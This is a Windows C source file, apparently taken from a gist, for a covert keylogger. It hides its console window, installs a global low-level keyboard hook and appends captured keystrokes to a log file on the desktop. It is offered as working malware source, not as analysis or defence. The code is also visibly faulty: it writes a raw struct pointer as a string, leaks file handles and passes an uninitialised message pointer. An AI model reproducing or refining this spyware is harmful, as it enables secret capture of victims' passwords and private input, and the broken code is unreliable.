#include <stdio.h>
#include <windows.h>
#include <winuser.h>
#define PATH "C:\\Users\\paraj\\Desktop\\logfile.txt"

HHOOK hook;
LPMSG msg;
FILE *file;

void Stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam){
    file = fopen("C:\\Users\\paraj\\Desktop\\logfile.txt", "a+");
    if (wParam == WM_KEYDOWN)
    {
        fputs((char *)lParam, file);
        fclose(file);

    }
    return CallNextHookEx(hook,code,wParam,lParam);
}

int main() {
    Stealth();
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook != NULL) 
        puts("All is good");
    else
        puts("Something went wrong :(");
    while(GetMessage(msg, NULL, 0, 0) > 0) {
        TranslateMessage(msg);
        DispatchMessage(msg);
    }
    return 0;
}
//https://gist.githubusercontent.com/5ynatra/24301454f4137688b563/raw/f35f84ddce95094560c99bb27931e9540851dc9a/hook.c